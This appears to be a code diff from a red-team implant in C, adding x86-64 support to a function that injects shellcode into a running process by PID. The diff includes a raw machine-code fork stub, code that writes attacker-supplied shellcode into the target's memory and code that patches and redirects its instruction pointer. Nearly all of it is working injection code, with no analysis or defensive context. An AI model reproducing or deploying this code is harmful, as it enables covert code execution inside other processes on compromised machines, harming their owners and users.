@@ -66,11 +66,12 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 	}
 }
 
-int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t shellcode_size) {
+int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size) {
 	HIJACK *hijack = NULL;
 	unsigned long shellcode_addr;
 	struct user_regs_struct *backup = NULL;
 	
+#ifdef __i386__
 	unsigned char fork_stub[] =
         	"\x60"                          // pushad
         	"\xb8\x02\x00\x00\x00"          // mov    $0x2,%eax
@@ -87,6 +88,16 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t
         	"\x90\x90\x90\x90"
         	"\x90\x90\x90\x90"
         	"\x90\x90\x90\x90";	
+#else
+	// See fork_stub64.asm
+	unsigned char fork_stub[] =
+		"\x9c\x50\x56\x57\x53\x51\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54"
+		"\x41\x55\x41\x56\x41\x57\x48\x31\xc0\xb8\x39\x00\x00\x00\x48\x31"
+		"\xff\x0f\x05\x48\x85\xc0\x74\x2a\x41\x5f\x41\x5e\x41\x5d\x41\x5c"
+		"\x41\x5b\x41\x5a\x41\x59\x41\x58\x59\x5b\x5f\x5e\x58\x9d\x48\x83"
+		"\xec\x08\xc7\x44\x24\x04\x44\x43\x42\x41\xc7\x04\x24\x48\x47\x46"
+		"\x45\xc3\x90\x90\x90\x90\x90\x90\x90\x90";
+#endif
 	
 	DEBUG_WRAP(fprintf(stderr, "Received shellcode injection request into %d\n", pid));
 
@@ -138,13 +149,14 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t
 	}
 	DEBUG_WRAP(fprintf(stderr, "Fork stub written successfully\n"));
 
-	if(WriteData(hijack, shellcode_addr + sizeof(fork_stub) - 1, (unsigned char *)shellcode, shellcode_size) != ERROR_NONE) {
+	if(WriteData(hijack, shellcode_addr + sizeof(fork_stub) - 1, (unsigned char *)shellcode, size) != ERROR_NONE) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to write the shellcode to memory.\n"));
 		Detach(hijack);
 		return -1;
 	}
 	DEBUG_WRAP(fprintf(stderr, "Shellcode written successfully\n"));
 
+#ifdef __i386__
 	if(WriteData(hijack, shellcode_addr + 19, (unsigned char *)&backup->eip, 4) != ERROR_NONE) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->eip));
 		Detach(hijack);
@@ -159,6 +171,28 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t
 		return -1;
 	}	
 	DEBUG_WRAP(fprintf(stderr, "EIP updated\n"));
+#else
+	if(WriteData(hijack, shellcode_addr + 70, (unsigned char *)&(backup->rip) + 4, 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
+		Detach(hijack);
+		return -1;
+	}
+	if(WriteData(hijack, shellcode_addr + 77, (unsigned char *)&(backup->rip), 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
+		Detach(hijack);
+		return -1;
+	}
+
+	DEBUG_WRAP(fprintf(stderr, "Original RIP patched to %p\n", (void *)backup->rip));
+	
+	backup->rip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
+	if(SetRegs(hijack, backup) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Error setting new EIP\n"));
+		Detach(hijack);
+		return -1;
+	}	
+	DEBUG_WRAP(fprintf(stderr, "RIP updated\n"));
+#endif
 
 	Detach(hijack);
 	DEBUG_WRAP(fprintf(stderr, "Red team go!\n"));
